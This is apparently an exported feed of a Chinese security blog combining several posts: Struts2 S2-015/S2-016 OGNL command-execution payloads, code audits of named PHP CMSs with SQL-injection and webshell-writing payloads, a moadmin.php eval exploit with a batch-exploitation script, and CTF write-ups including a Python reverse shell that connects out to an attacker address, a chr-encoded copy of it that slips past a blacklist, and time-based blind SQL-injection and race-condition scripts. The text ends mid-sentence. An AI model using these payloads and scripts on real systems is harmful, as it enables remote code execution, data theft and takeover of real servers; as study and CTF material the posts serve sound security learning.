在/tmp/目录下创建success文件，无回显 S2-015原理漏洞产生于配置了 Action 通配符 *，并将其作为动态值时，解析时会将其内容执行 OGNL 表达式例如： 123456&lt;package name="S2-015" extends="struts-default"&gt; &lt;action name="*" class="com.demo.action.PageAction"&gt; &lt;result&gt;/&#123;1&#125;.jsp&lt;/result&gt; &lt;/action&gt;&lt;/package&gt;​```&lt;/font&gt; 上述配置能让我们访问 name.action 时使用 name.jsp 来渲染页面，但是在提取 name 并解析时，对其执行了 OGNL 表达式解析，所以导致命令执行。在实践复现的时候发现，由于 name 值的位置比较特殊，一些特殊的字符如 / “ \ 都无法使用（转义也不行），所以在利用该点进行远程命令执行时一些带有路径的命令可能无法执行成功。 POC1$&#123;#context[&apos;xwork.MethodAccessor.denyMethodExecution&apos;]=false,#m=#_memberAccess.getClass().getDeclaredField(&apos;allowStaticMethodAccess&apos;),#m.setAccessible(true),#m.set(#_memberAccess,true),#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&apos;id&apos;).getInputStream()),#q&#125; 利用将POCURL编码后直接利用 S2-016原理在struts2中，DefaultActionMapper类支持以”action:”、”redirect:”、”redirectAction:”作为导航或是重定向前缀，但是这些前缀后面同时可以跟OGNL表达式，由于struts2没有对这些前缀做过滤，导致利用OGNL表达式调用java静态方法执行任意系统命令 POC1redirect:$&#123;#context[&quot;xwork.MethodAccessor.denyMethodExecution&quot;]=false,#f=#_memberAccess.getClass().getDeclaredField(&quot;allowStaticMethodAccess&quot;),#f.setAccessible(true),#f.set(#_memberAccess,true),#a=@java.lang.Runtime@getRuntime().exec(&quot;uname -a&quot;).getInputStream(),#b=new java.io.InputStreamReader(#a),#c=new java.io.BufferedReader(#b),#d=new char[5000],#c.read(#d),#genxor=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter(),#genxor.println(#d),#genxor.flush(),#genxor.close()&#125; 利用同样需要把POC进行编码后利用 暂告一段落未完待续……]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>JavaWeb</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[代码审计一周总结 11-3]]></title>
    <url>%2F2018%2F11%2F03%2F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B8%80%E5%91%A8%E6%80%BB%E7%BB%93-1%2F</url>
    <content type="text"><![CDATA[看了一周的PHP了，算是做个总结 1. Tun2 免费版本/inc/config_db.php里存在过滤函数 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152function inject_check($sql_str) &#123; return eregi('select|insert|update|delete|\'|\/\*|\*|\.\.\/|\.\/|union|into|load_file|outfile', $sql_str); // 进行过滤 &#125; function verify_id($id=null) &#123;if($id)&#123; if (inject_check($id)) &#123; exit('提交的参数非法！'); &#125; // 注射判断 elseif (!is_numeric($id)) &#123; exit('提交的参数非法！'); &#125; // 数字判断 $id = intval($id); // 整型化&#125;return $id; &#125; function str_check( $str ) &#123; if (!get_magic_quotes_gpc()) &#123; // 判断magic_quotes_gpc是否打开 $str = addslashes($str); // 进行过滤 &#125; $str = str_replace("_", "\_", $str); // 把 '_'过滤掉 $str = str_replace("%", "\%", $str); // 把 '%'过滤掉 return $str; &#125; function post_check($post) &#123; if (!get_magic_quotes_gpc()) &#123; // 判断magic_quotes_gpc是否为打开 $post = addslashes($post); // 进行magic_quotes_gpc没有打开的情况对提交数据的过滤 &#125; $post = str_replace("_", "\_", $post); // 把 '_'过滤掉 $post = str_replace("%", "\%", $post); // 把 '%'过滤掉 $post = nl2br($post); // 回车转换 $post = htmlspecialchars($post); // html标记转换 //stripcslashes return $post; &#125;function uh ( $str ) &#123; $farr = array( "/\s+/" , //过滤多余的空白 "/&lt;(\/?)(script|META|STYLE|HTML|HEAD|BODY|STYLE |i?frame|b|strong|style|html|img|P|o:p|iframe|u|em|strike|BR|div|a|TABLE|TBODY|object|tr|td|st1:chsdate|FONT|span|MARQUEE|body|title|\r\n|link|meta|\?|\%)([^&gt;]*?)&gt;/isU" , //过滤 &lt;script 防止引入恶意内容或恶意代码,如果不需要插入flash等,还可以加入&lt;object的过滤 "/(&lt;[^&gt;]*)on[a-zA-Z]+\s*=([^&gt;]*&gt;)/isU" , //过滤javascript的on事件 ); $tarr = array( " " , "" , //如果要直接清除不安全的标签，这里可以留空 "\\1\\2" , ); $str = preg_replace ( $farr , $tarr , $str ); $str2 = str_replace ('&lt;','&amp;lt;' , $str ); $str3 = str_replace ('&gt;','&amp;gt;' , $str2 ); return $str3 ; &#125; 正则匹配搜索一下\$_POST|\$_GET|\$_REQUESR 除了后台界面有些没过滤，前台参数在传递时基本被过滤了，仅有的几个没被过滤的也没有利用价值 Admin_Notice.php 后台注入中随意举个栗子 12345678............function edit( )&#123; global $db,$DB_dbprefix; $db-&gt;query( "select * from &#123;$DB_dbprefix&#125;notice WHERE id=".$_GET['id'] );............ 1.注入id不需要闭合单引号，可直接进行注入 构造payload http://localhost:8080/Tun2/Admin/Admin_Notice.php?Action=edit&amp;id=1 union select 1,database(),user(),1 limit 1,1 2.直接数据库查询后台存在数据库管理 可以直接进行查询 3.任意文件读写GETSHELLAdmin_Templates.php 1234567891011121314151617181920case "edit" : if ( !( $fp = fopen( $_GET['editfile'], "rb" ) ) ) &#123; exit( "不能打开文件".$_GET['editfile'] ); &#125; $data = fread( $fp, filesize( $_GET['editfile'] ) ); echo "&lt;script language=\"javascript\" src=\"inc/js.js\"&gt;&lt;/script&gt;\r\n&lt;table width=\"98%\" border=\"1\" align=\"center\" cellpadding=\"5\" cellspacing=\"0\" class=\"table\"&gt;\r\n &lt;form action=\"Admin_Templates.php?Action=editsever\" method=\"post\" onSubmit=\"return Validator.Validate(this,3)\"&gt;\r\n &lt;tr&gt;\r\n &lt;td width=\"15%\" align=\"right\"&gt;文件名称：&lt;/td&gt;\r\n &lt;td&gt;&lt;input name=\"filename\" type=\"text\" value=\""; echo $_GET['file']; echo "\" size=\"40\" readonly&gt;&lt;/td&gt;\r\n &lt;/tr&gt;\r\n &lt;tr&gt;\r\n &lt;td colspan=\"2\" align=\"right\"&gt;&lt;textarea name=\"htmlcontent\" style=\"width:100%\" rows=\"30\" dataType=\"Require\" msg=\"请填写模版内容\"&gt;"; echo str_replace("textarea&gt;", "textarea＞", $data); echo "&lt;/textarea&gt;&lt;/td&gt;\r\n &lt;/tr&gt;\r\n &lt;tr&gt;\r\n &lt;td colspan=\"2\" align=\"center\"&gt;&lt;input name=\"file\" type=\"hidden\" value=\""; echo $_GET['editfile']; echo "\"&gt;&lt;input type=\"submit\" name=\"Submit_add\" value=\"修改模板\" /&gt;&lt;/td&gt;\r\n &lt;/tr&gt;\r\n &lt;/form&gt;\r\n&lt;/table&gt;\r\n\t"; fclose( $fp ); break; case "editsever" : wfile( $_POST['file'], stripcslashes( str_replace("textarea＞", "textarea&gt;", $_POST['htmlcontent']) ) ); addlog( "修改模板".$_POST['filename'], $_SESSION['user_name'] ); admin_showerr( "&lt;li&gt;模板修改成功&lt;/li&gt;", "Admin_Templates.php", 1 ); break; 以上两个都可以GETSHELL，这里用editsever进行举例 构造payload 访问shell.php 2.乘风多用户PHP统计系统 v5.2首先看下过滤函数 123456789101112131415161718192021222324252627282930313233343536373839function chkstr($paravalue,$paratype) //过滤非法字符&#123; if($paratype==1) &#123; $filterstr="(and|or)\\b.+?(&gt;|&lt;|=|in|like)|\\/\\*.+?\\*\\/|&lt;\\s*script\\b|\\bEXEC\\b|UNION.+?SELECT|UPDATE.+?SET|INSERT\\s+INTO.+?VALUES|(SELECT|DELETE).+?FROM|(CREATE|ALTER|DROP|TRUNCATE)\\s+(TABLE|DATABASE)"; if (preg_match("/".$filterstr."/is",$paravalue)==1)&#123; echo "传递的参数类型有错误！"; exit; &#125; $inputstr=str_replace("'","''",$paravalue); &#125; elseif($paratype==2) &#123; if($paravalue!=""&amp;&amp;is_numeric($paravalue)==false) &#123; echo "传递的参数类型有错误！"; exit; &#125; else &#123; $inputstr=$paravalue; &#125; &#125; elseif($paratype==3) &#123; if($paravalue!=""&amp;&amp;(strtotime($paravalue)==false||strtotime($paravalue)==-1)) &#123; echo("传递的参数类型有错误！"); exit; &#125; else &#123; $inputstr=$paravalue; &#125; &#125; return $inputstr;&#125; 显然，很难绕过，所以先找下没被过滤的参数 1.后台SQL注入searchmodify.php 12345678&lt;?php $id=$_GET["id"];$sql="select * from cfstat_search_set where id='$id'";echo $sql;$result=mysql_query($sql);$rs=mysql_fetch_assoc($result);?&gt; payload http://localhost/cfstat/adminuser.php?action=searchmodify&amp;id=1%27%20union%20select%201,2,3,user()%20limit%201,1%23 此外还有一处是注册用户后可进行注册，发生在view.php就不在细说 123456&lt;?php $username=$_GET["username"];$sql="select pagename,gbookstate from cfstat_user where username='$username'";$result=mysql_query($sql);$rs=mysql_fetch_assoc($result);?&gt; 3.CWCMS 网站管理系统PHP版1.全站SQL注入未对传入参数进行任何处理，可以随意进行SQL注入 登录窗口构造payload 1user=' union select md5(1),md5(1),md5(1),md5(1)#&amp;pass=1&amp;yzm=32485&amp;act=login 登陆成功 2.后台修改设置GETSHELL123456789$html.="&lt;?php".chr(10); $html.=chr(36)."cw_name=".chr(34).$_POST["cw_name"].chr(34).chr(59).chr(10); $html.=chr(36)."cw_host=".chr(34).$_POST["cw_host"].chr(34).chr(59).chr(10); $html.=chr(36)."cw_root=".chr(34).$_POST["cw_root"].chr(34).chr(59).chr(10); $html.=chr(36)."cw_upfile=".chr(34).$_POST["cw_upfile"].chr(34).chr(59).chr(10); $html.=chr(36)."index_title=".chr(34).$_POST["index_title"].chr(34).chr(59).chr(10);....... cw_create("../inc/","config.php",$html); echo("&lt;script&gt;alert('设置修改成功！');location.href='cw_web.php';&lt;/script&gt;"); 构造payload cw_name=创文企业网站管理系统&quot;;phpinfo()// 4.夏日PHP电子商务系统V.021.全站SQL注入并未对输入做过滤，随意找一个注入点进行注入，就不进行分析了 总结目前还是比较菜，大多数漏洞只能在后台界面发现，大多数漏洞原因是开发者在某个页面少了过滤。 待续]]></content>
      <tags>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[monogodb moadmin.php漏洞分析]]></title>
    <url>%2F2018%2F10%2F28%2Fmonogodb-moadmin-php%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[moadmin.php漏洞分析 moadmin.php代码执行漏洞简单的对moadmin.php的漏洞进行了下分析，先搜索一些常见漏洞函数，发现两处eval函数调用 saveObject listRows 先看下追踪下saveObject函数 12345678if (isset($_POST['object'])) &#123; if (self::$model-&gt;saveObject($_GET['collection'], $_POST['object'])) &#123; return $this-&gt;_dumpFormVals(); &#125; else &#123; $action = 'editObject'; $_POST['errors']['object'] = 'Error: object could not be saved - check your array syntax.'; &#125; &#125; 并未对传入的数据进行过滤，也就是说可以直接构造payload 12345POST /moadmin.php?collection=admin HTTP/1.1............object=1;phpinfo();exit(); 即可返回phpinfo界面 再看下listRows函数 12345678910if (isset($_GET['find']) &amp;&amp; $_GET['find']) &#123; $_GET['find'] = trim($_GET['find']); if (strpos($_GET['find'], 'array') === 0) &#123; eval('$find = ' . $_GET['find'] . ';'); &#125; else if (is_string($_GET['find'])) &#123; if ($findArr = json_decode($_GET['find'], true)) &#123; $find = $findArr; &#125; &#125; &#125; 只要find存在即可构造payload,需要注意的是这里find的值里要存在array，且放在开头位置 123POST /moadmin.php?collection=admin&amp;action=listRows&amp;find=array(1);phpinfo();exit() HTTP/1.1............ 批量利用的python脚本 1234567891011121314151617181920212223#coding:utf-8import requestsip = []#导入IPurl = 'http://&#123;0&#125;/moadmin.php?collection=admin'data = &#123; 'object':"object=1;system('getFlag');exit();"&#125;eCount = 0 #错误次数while len(ip): for i in ip: res = requests.get(url.format(i)) if 'I/O Error' in res.text: print(i,"Try again later...") else if 'Congratulation' in res.text: print(i,"Success get it!") ip.remove(i) else: print(i,"May be something error...") eCount = eCount + 1 if eCount &gt;= 10: print("No,fatal error!") exit()]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[某CTF的Baby PHP]]></title>
    <url>%2F2018%2F10%2F18%2F%E6%9F%90CTF%E7%9A%84Baby-PHP%2F</url>
    <content type="text"><![CDATA[主要考察PHP Trick 源码参上1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556 &lt;?phprequire_once('flag.php');error_reporting(0);if(!isset($_GET['msg']))&#123; highlight_file(__FILE__); die();&#125;@$msg = $_GET['msg'];if(@file_get_contents($msg)!=="Hello Challenge!")&#123; die('Wow so rude!!!!1');&#125;echo "Hello Hacker! Have a look around.\n";@$k1=$_GET['key1'];@$k2=$_GET['key2'];$cc = 1337;$bb = 42;if(intval($k1) !== $cc || $k1 === $cc)&#123; die("lol no\n");&#125;if(strlen($k2) == $bb)&#123; if(preg_match('/^\d+＄/', $k2) &amp;&amp; !is_numeric($k2))&#123; if($k2 == $cc)&#123; @$cc = $_GET['cc']; &#125; &#125;&#125;list($k1,$k2) = [$k2, $k1];if(substr($cc, $bb) === sha1($cc))&#123; foreach ($_GET as $lel =&gt; $hack)&#123; $$lel = $hack; &#125;&#125;$‮b = "2";$a="‮b";//;1=bif($$a !== $k1)&#123; die("lel no\n");&#125;// plz die nowassert_options(ASSERT_BAIL, 1);assert("$bb == $cc");echo "Good Job ;)";// TODO// echo $flag; 首先第一点1234@$msg = $_GET['msg'];if(@file_get_contents($msg)!=="Hello Challenge!")&#123; die('Wow so rude!!!!1');&#125; 需要使用php://input,或者是data://text/plain php://iinput形如 1234GET /?msg=php://input HTTP/1.1Host ****Hello Challenge! data://text/plain的话是构造 ?msg=data://text/plain,Hello Challenge! 第二点123if(intval($k1) !== $cc || $k1 === $cc)&#123; die("lol no\n");&#125; 这里的$k1===$cc用的是三个等号进行比较，比较的两个变量要求类型一致，而PHP传参的时候是默认String类型的，所以$key1=1337即可 第三点1234567if(strlen($k2) == $bb)&#123; if(preg_match('/^\d+＄/', $k2) &amp;&amp; !is_numeric($k2))&#123; if($k2 == $cc)&#123; @$cc = $_GET['cc']; &#125; &#125;&#125; 这里需要注意preg_match(&#39;/^\d+＄/&#39;, $k2)中的是＄而非$,所以只要构造$key2=000000000000000000000000000000000001337%EF%BC%84即可绕过 第四点1234567891011if(substr($cc, $bb) === sha1($cc))&#123; foreach ($_GET as $lel =&gt; $hack)&#123; $$lel = $hack; &#125;&#125;$‮b = "2";$a="‮b";//;1=bif($$a !== $k1)&#123; die("lel no\n");&#125; 传值cc[]=此时substr和sha1都会返回false，之后便是变量覆盖，再传参k1=2即可. 第五点1assert("$bb == $cc"); 构造$bb=$GLOBALS;\\即可 所以最后的payload为 1?msg=php://input&amp;key1=1337&amp;key2=000000000000000000000000000000000001337%EF%BC%84&amp;cc[]=&amp;k1=2&amp;bb=var_dump($GLOBALS);//]]></content>
      <categories>
        <category>CTF</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[护网杯部分题目Wp]]></title>
    <url>%2F2018%2F10%2F13%2F%E6%8A%A4%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEWp%2F</url>
    <content type="text"><![CDATA[还是太菜了，只做出了三道题 迟来的签到题下载文件后是一段字符 AAoHAR1WX1VQVlNVU1VRUl5XXyMjI1FWJ1IjUCQnXlZWXyckXhs= 尝试了下，可以base64解码，不过解出来是乱码 题目提示XOR，flag一般格式为flag{}，所以先试下 chr(ord(a[0]) ^ ord(a[len(a)-1]) ^ ord(&#39;f&#39;)) 可以得到flag了 FEZfez.py 12345678910111213141516171819202122232425262728293031import osdef xor(a,b): assert len(a)==len(b) c="" for i in range(len(a)): c+=chr(ord(a[i])^ord(b[i])) return cdef f(x,k): return xor(xor(x,k),7)def round(M,K): L=M[0:27] R=M[27:54] new_l=R new_r=xor(xor(R,L),K) return new_l+new_rdef fez(m,K): for i in K: m=round(m,i) return mK=[]for i in range(7): K.append(os.urandom(27))m=open("flag","rb").read()assert len(m)&lt;54m+=os.urandom(54-len(m))test=os.urandom(54)print test.encode("hex")print fez(test,K).encode("hex")print fez(m,K).encode("hex") fez.log 123c8b84d08e5a8e60a49578f387fff5a90e9e7c181734bf05be4f5403c9ea24a0b8741a329991637e11fa69019cd3b01d7c95b65f5abd55c3660c27cb9b3785a5ce06022e88bc831017e882d39475ea85d919ad9e5ac498f86c553216cab1f8f7468353d46ba8971efa9ca8c81519ab6fc0e435da00516b844f8fe664bfe9445992f478dc650701739a11ffda5bbeb643159d7e8cd03a2104c798a1ca734b905ee6c76 方便描述，给fez.log的值赋给三个变量 123a = "c8b84d08e5a8e60a49578f387fff5a90e9e7c181734bf05be4f5403c9ea24a0b8741a329991637e11fa69019cd3b01d7c95b65f5abd5"b = "5c3660c27cb9b3785a5ce06022e88bc831017e882d39475ea85d919ad9e5ac498f86c553216cab1f8f7468353d46ba8971efa9ca8c81"c = "519ab6fc0e435da00516b844f8fe664bfe9445992f478dc650701739a11ffda5bbeb643159d7e8cd03a2104c798a1ca734b905ee6c76" b,c都是fez函数得到的，分析看看fez函数，作用是将m分成两段L,R，前后异或处理后与i异或,得到new_R,而R则成了new_L,拼接成m，循环Len(K)次 易知K的长度为7，有Ri,Li,Ki 最后可以得到 123L= R1^K2^K3^K5^K6R = R1^K1^L1^k2^k4^K6^K7 结合a,b,c很轻松得到flag 还剩下一部分思路差不多的 easy_tornado打开题目，有个文件列表 随便访问一个有两个参数，随便修改下 试了下模板注入，可以，只不过是过滤了许多东西，hint里面有一个cookie_secret 用的是tornado,了解到其存在一个hander.settings里面有cookie_secret 得到cookie_secret后加密得到签名，最后拿到flag]]></content>
      <categories>
        <category>CTF</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Inctf&HackoverCTF Web部分题目解析]]></title>
    <url>%2F2018%2F10%2F09%2FInctf-HackoverCTF-Web%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE%E8%A7%A3%E6%9E%90%2F</url>
    <content type="text"><![CDATA[Hackover CTF与InCTF部分Web题目解析 Hackover CTFwho knows john dows? Description Howdy mate! Just login and hand out the flag, aye! You can find on h18johndoe has all you need! http://yo-know-john-dow.ctf.hackover.de:4567/login alternative: 46.101.157.142:4567/login 题目给的链接中有一个是GitHub地址，在里面有源码存在 1234567891011121314151617181920212223242526272829class UserRepo def initialize(database) @database = database @users = database[:users] end def login(identification, password) hashed_input_password = hash(password) query = "select id, phone, email from users where email = '#&#123;identification&#125;' and password_digest = '#&#123;hashed_input_password&#125;' limit 1" puts "SQL executing: '#&#123;query&#125;'" @database[query].first if user_exists?(identification) end def user_exists?(identification) !get_user_by_identification(identification).nil? end private def get_user_by_identification(identification) @users.where(phone: identification).or(email: identification).first end def hash(password) password.reverse endend 显而易见的存在有SQL注入漏洞，其中的hash加密密码更是只把密码反转了下，所以只要构造 1password=' or 1=1 limit 1# 然后反转一下就可以了 看下Web界面 需要找到一个邮箱 从GitHub下手，把仓库clone到本地后，查看下日志 经过尝试最后`john_doe@notes.h18`登陆成功 最后尝试注入的时候居然出现了500错误，修改payload为 1password=' or 1=1 limit 1;# 反转后输入密码，成功得到flag InCTFS3cur3 BankDescription 12345678S3cur3 Bank 179======= Difficulty level : Medium ========It is notoriously called the most secure bank service ever. It allows us to transfer your money between 2 accounts. Can you hack the service to buy a flag???Link(http://18.188.42.158/)========== Authors : c3rb3ru5, SpyD3r ========== 题目给了两个账号，相互之间可以互相转账，只有5000金币才可以买到flag，而我们两个银行加起来才2000，这样的题一般情况下就是在执行一项操作时并不会进行锁定，就相当于饭卡里有一百块钱，同时在两台机器上刷都显示100，全部花完后饭卡里没钱了，而我们一共得到了200块钱的食物。 利用脚本一枚 12345678910111213141516171819import requestsimport threadingurl = "http://18.188.42.158/bank.php?id=dc90a0a10c79e341f5b521da39dbc585"def make_money(): data = &#123;"transfer": 1000, "account": "Transfer to B"&#125; response = requests.post(url,data=data) print(response.text)try: t1 = threading.Thread(target=make_money, args=[]) t2 = threading.Thread(target=make_money, args=[]) t1.start() t2.start()except: print("Error: unable to start thread") 其中的transfer在每次成功后都要改，account在每次运行后都要更改，并不会每次都成功。 最后可以终于买到flag了~~ The Most Secure File UploaderDescription Somehow the codes are all messed up and it seems that it was my younger brother. He messed up my File Uploader. But I know you…You don’t look like a hacker at all…Can you fix this for me? :) http://18.216.190.57/ Challenge Difficulty Level:Medium Web界面一个上传点儿就这么放在了眼前 看到上传界面先上传了个txt 嗯，只能上传图片文件的话我再来一个png文件 还是报错 不过这个报错提示有点儿熟悉，好像是python一样，索性把图片平改成1#.png试一下(#在python中是注释的意思 页面返回正常 试下print 好的！接下来用python写个反弹shell吧 1exec(import socket, subprocess;s = socket.socket();s.connect(('ip',端口))\nwhile 1: proc = subprocess.Popen(s.recv(1024), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE);s.send(proc.stdout.read()+proc.stderr.read())) 在自己服务器上打开监听，不想却有黑名单存在,不过exec没在黑名单里 利用Ascii编码绕过黑名单具体做法是把payload改为 1exec(''.join([chr(105),chr(109),chr(112),chr(111),chr(114),chr(116),chr(32),chr(115),chr(111),chr(99),chr(107),chr(101),chr(116),chr(44),chr(32),chr(115),chr(117),chr(98),chr(112),chr(114),chr(111),chr(99),chr(101),chr(115),chr(115),chr(59),chr(115),chr(32),chr(61),chr(32),chr(115),chr(111),chr(99),chr(107),chr(101),chr(116),chr(46),chr(115),chr(111),chr(99),chr(107),chr(101),chr(116),chr(40),chr(41),chr(59),chr(115),chr(46),chr(99),chr(111),chr(110),chr(110),chr(101),chr(99),chr(116),chr(40),chr(40),chr(39),chr(105),chr(112),chr(39),chr(44),chr(50),chr(51),chr(51),chr(51),chr(41),chr(41),chr(10),chr(119),chr(104),chr(105),chr(108),chr(101),chr(32),chr(49),chr(58),chr(32),chr(32),chr(112),chr(114),chr(111),chr(99),chr(32),chr(61),chr(32),chr(115),chr(117),chr(98),chr(112),chr(114),chr(111),chr(99),chr(101),chr(115),chr(115),chr(46),chr(80),chr(111),chr(112),chr(101),chr(110),chr(40),chr(115),chr(46),chr(114),chr(101),chr(99),chr(118),chr(40),chr(49),chr(48),chr(50),chr(52),chr(41),chr(44),chr(32),chr(115),chr(104),chr(101),chr(108),chr(108),chr(61),chr(84),chr(114),chr(117),chr(101),chr(44),chr(32),chr(115),chr(116),chr(100),chr(111),chr(117),chr(116),chr(61),chr(115),chr(117),chr(98),chr(112),chr(114),chr(111),chr(99),chr(101),chr(115),chr(115),chr(46),chr(80),chr(73),chr(80),chr(69),chr(44),chr(32),chr(115),chr(116),chr(100),chr(101),chr(114),chr(114),chr(61),chr(115),chr(117),chr(98),chr(112),chr(114),chr(111),chr(99),chr(101),chr(115),chr(115),chr(46),chr(80),chr(73),chr(80),chr(69),chr(44),chr(32),chr(115),chr(116),chr(100),chr(105),chr(110),chr(61),chr(115),chr(117),chr(98),chr(112),chr(114),chr(111),chr(99),chr(101),chr(115),chr(115),chr(46),chr(80),chr(73),chr(80),chr(69),chr(41),chr(59),chr(115),chr(46),chr(115),chr(101),chr(110),chr(100),chr(40),chr(112),chr(114),chr(111),chr(99),chr(46),chr(115),chr(116),chr(100),chr(111),chr(117),chr(116),chr(46),chr(114),chr(101),chr(97),chr(100),chr(40),chr(41),chr(43),chr(112),chr(114),chr(111),chr(99),chr(46),chr(115),chr(116),chr(100),chr(101),chr(114),chr(114),chr(46),chr(114),chr(101),chr(97),chr(100),chr(40),chr(41),chr(41)])) 拿到反弹的Sehll找到flag 使用globals()函数调用内置函数先来看下globals()的定义 返回全局变量的字典。 就是这些东东 其中第一项里包含了python的内置函数，可以通过globals().values()[0].__dict__查看 import也是python内置函数，可以通过globals().values()[0].__dict__[&#39;__import__&#39;](模块名).function()调用指定函数,例如导入os.listdir()函数 回到题目，本来也可以通过globals()调用os.listdir但是os被禁了，只好采用另一种方式 1globals().values()[0].__dict__['X19pbXBvcnRfXw=='.decode('base64')]('b3M='.decode('base64')).listdir('./') 将被禁的字符转化为base64，成功绕过 最后就是利用内置函数open来打开flag文件啦 GoSQL开始前先来几个MySQL的一些知识 1.字符集为utf-8的情况下 1234Ä = A Ö = O Ü = U à = a 上述等式是成立的 也就是说 1àdmin = admin 2.MySQL中 /*select * from users*/表示注释/**/内的语句并不会执行，但是/*!select * from users*/确实可以执行的 3.sleep可以代替if充当判断的角色 当条件为真时 条件为假时 4.可以等效替换的一些关键词 1234where : havingsubstr : insert&lt;space&gt; : %0a = : in 进入题目 12345678910111213141516171819202122232425262728293031323334353637383940query: select * from inctf2018_chall_2 /**/ username=''Having a query problem&lt;?phpinclude("./config.php");$conn = mysqli_connect($host,$dbuser,$dbpass,$dbname);if (!$conn) &#123; die("Connection failed: " . mysqli_connect_error());&#125;mysqli_set_charset($conn,"utf8");$name = $_GET['name'];$clause = $_GET['clause'];$blacklist = "pad|admin|'|\"|substr|mid|concat|char|ascii|left|right|for| |from|where|having";$blacklist .= "insert|username|\/|-|go_to|\||or|and|\\\|=|#|\.|\_|like|between|reg|&amp;|load|file|glob|cast|out|0";$blacklist .= "user|rev|0x|limit|conv|hex|from|innodb|\^|union|benchmark|if|case|coalesce|max|strcmp|proc|group|rand|floor|pow";if (preg_match("/$blacklist/i", $name))&#123; die("Try Hard");&#125;if(preg_match("/$blacklist/i", $clause))&#123; die("You don't need it!!!");&#125;$query="select * from inctf2018_chall_2 /*". $clause . "*/ username='" . $name . "'";echo "&lt;h4&gt;query: " . $query . " &lt;/h4&gt;";$result=mysqli_query($conn,$query);if($result)&#123; $row=mysqli_fetch_array($result); if($row['username']=="admin")&#123; header("Location:&#123;$row['go_to']&#125;");&#125; else&#123; echo "&lt;h4&gt;You are not admin" . "&lt;/h4&gt;"; &#125;&#125;else&#123; echo "&lt;h4&gt;Having a query problem" . "&lt;/h4&gt;&lt;br&gt;";&#125;highlight_file(__FILE__);?&gt; 可以看到其设置了黑名单，但是 having insert 0 user sleep却没有在黑名单里，其中前四个都是因为拼接的时候没加|导致的，这点儿后面会用到 这一步用前两点构造payload clause=!having&amp;name=àdmin 进入下一个场景 自然想到SSRF 尝试了file|ftp好像都被过滤了，最后试了下Gopher，没被过滤，那么现在就需要数据库账号了，刚好利用前面的having与insert 12345678910111213141516171819202122232425262728293031323334353637383940414243import requestsfrom time import timeurl="http://18.219.221.225/?clause="user_name=""len_user=20'''for i in range(1,50): query=url + "!having%0asleep(((select%0alength(user()))%0ain%0a(select%0a0b" + "&#123;:b&#125;".format(i) + "))*3);%00" start = time() req=requests.get(query) end=time() if((end-start)&gt;=2): len_user=i break print (i)'''print("Got the user length : " + str(len_user))flag=""def iterate(): temp="" for i in range(0,len(flag),2): temp+="&#123;:b&#125;".format(int(flag[i:i+2])).rjust(8,"0") return tempfor j in range(1,len_user+1): for i in range(64,122): query=url + "!having%0asleep(((select%0ainsert(user()," + str(j+1) + ",255,space(0)))%0ain%0a(select%0a0b" + iterate() + "&#123;:b&#125;".format(i).rjust(8,"0") + "))*3);%00" print(query) if i == 65: exit() start=time() req=requests.get(query) end=time() if((end-start)&gt;=2): flag+=str(i) user_name +=chr(i) break print(i)print ("Got the user name: " + user_name) 得到username:INCTF_SSRF 之后利用了这款工具:https://github.com/tarunkant/Gopherus 构造payload后查看用户读写权限 应该可以读写的，尝试下读取/etc/mysql/mysql.conf.d/mysqld.cnf这是MySQL的配置文件，可以看到能够写入文件到哪里 看出来给了提示/tmp_is_great 于是写shell到/tmp_is_great,最后测试下shell 最后只要cat 一下flag文件就可以啦]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[XiaoCMS漏洞分析]]></title>
    <url>%2F2018%2F10%2F06%2FXiaoCMS%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[继续进行代码审计，本次选择的是XiaoCMS 0x01 简单分析这个CMS采用的MVC模式，先看下入口文件 index.php 12345678&lt;?php/** * XiaoCms企业建站版 * 官方网站:http://www.xiaocms.com */define('XIAOCMS_PATH', dirname(__FILE__) . DIRECTORY_SEPARATOR);include XIAOCMS_PATH . 'core/xiaocms.php';xiaocms::run(); 包含了xiaocms.php 有一个安全处理函数,将’/‘和’.’替换为’’ 123private static function _safe($str) &#123; return str_replace(array('/', '.'), '', $str);&#125; 还有一个读取文件的函数，不过用在了加载控制器中了，也没什么用 进入Base.class.php 重新定义了GET和POST方法 1234567891011121314public static function get($string) &#123; if (!isset($_GET[$string])) return null; if (!is_array($_GET[$string])) return htmlspecialchars(trim($_GET[$string])); return null; &#125; public static function post($string) &#123; if (!isset($_POST[$string])) return null; if (!is_array($_POST[$string])) return htmlspecialchars(trim($_POST[$string])); $postArray = self::array_map_htmlspecialchars($_POST[$string]); return $postArray; &#125; htmlspecialchars会将&lt;&gt;和双引号过滤 0x02 后台任意文件上传看到有upload.class.php，进去看下,有个upload函数 12345678public function upload($file_upload, $file_name) &#123; if (!is_array($file_upload) || empty($file_name)) return false; $this-&gt;parse_init($file_upload); if (!@move_uploaded_file($this-&gt;file_name['tmp_name'], $file_name)) return '文件上传失败，请检查服务器目录权限'; return true; &#125; 跟进parse_init函数 123456789101112131415protected function parse_init($file) &#123; $this-&gt;file_name = $file; if ($this-&gt;file_name['size'] &gt; $this-&gt;limit_size) &#123; echo '您上传的文件:' . $this-&gt;file_name['name'] . ' 大小超出上传限制!'; exit(); &#125; if ($this-&gt;limit_type) &#123; if (!in_array($this-&gt;get_file_ext(), $this-&gt;limit_type)) &#123; echo '您上传的:' . $this-&gt;file_name['name'] . ' 